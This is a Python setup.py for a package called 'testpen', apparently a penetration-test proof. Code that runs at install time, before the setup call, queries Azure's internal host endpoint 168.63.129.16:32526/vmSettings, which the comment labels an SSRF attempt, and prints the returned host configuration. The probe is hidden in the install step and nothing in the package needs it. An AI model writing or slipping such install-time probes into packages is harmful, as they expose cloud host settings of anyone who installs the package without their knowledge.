import urllib.request
import urllib.error
import os

# Attempt to read Azure HGAP vmSettings via SSRF
try:
    req = urllib.request.Request(
        'http://168.63.129.16:32526/vmSettings',
        headers={'Accept': 'application/json'}
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = resp.read().decode('utf-8')
        print(f"\n[SSRF_PROOF] HTTP {resp.status} from 168.63.129.16:32526/vmSettings")
        print(f"[SSRF_CONTENT] {data[:2000]}")
except urllib.error.URLError as e:
    print(f"[SSRF_ERROR] {e}")
except Exception as e:
    print(f"[SSRF_EXCEPTION] {type(e).__name__}: {e}")

from setuptools import setup
setup(name='testpen', version='0.0.1', install_requires=[])
